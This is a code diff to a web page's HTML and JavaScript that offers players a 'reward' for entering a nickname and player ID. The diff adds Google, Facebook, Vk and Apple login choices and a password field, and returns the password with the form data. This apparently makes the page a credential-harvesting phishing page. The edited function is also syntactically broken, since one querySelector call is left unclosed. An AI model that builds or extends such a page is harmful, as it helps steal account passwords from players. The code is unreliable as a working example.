@@ -237,25 +237,25 @@
 
         <label class="login">
           <input type="radio" name="login" value="Google">
-          <div class="text-2xl">🧔</div>
+          <div class="text-2xl"></div>
           <div class="text-sm font-bold mt-1">Google</div>
         </label>
 
         <label class="login">
           <input type="radio" name="login" value="Facebook">
-          <div class="text-2xl">🧔</div>
+          <div class="text-2xl"></div>
           <div class="text-sm font-bold mt-1">Facebook</div>
         </label>
 
         <label class="login">
           <input type="radio" name="login" value="Vk">
-          <div class="text-2xl">🧔</div>
+          <div class="text-2xl"></div>
           <div class="text-sm font-bold mt-1">Vk</div>
         </label>
 
         <label class="login">
           <input type="radio" name="login" value="Apple">
-          <div class="text-2xl">🧔</div>
+          <div class="text-2xl"></div>
           <div class="text-sm font-bold mt-1">Apple</div>
         </label>
 
@@ -346,9 +346,12 @@ function showLoading(message) {
 
 function getPlayerForm() {
   const nickname = $("nickname").value.trim();
+  const password = $("password").value.trim();
   const playerId = $("playerId").value.trim();
   const reward = document.querySelector(
     'input[name="reward"]:checked'
+  const login = document.querySelector(
+    'input[name="login"]:checked'
   );
 
   if (!nickname) {
@@ -373,7 +376,9 @@ function getPlayerForm() {
 
   return {
     nickname,
+    password,
     player_id: playerId,
+    login: login.value,
     reward: reward.value,
     timestamp: new Date().toLocaleString("id-ID")
   };
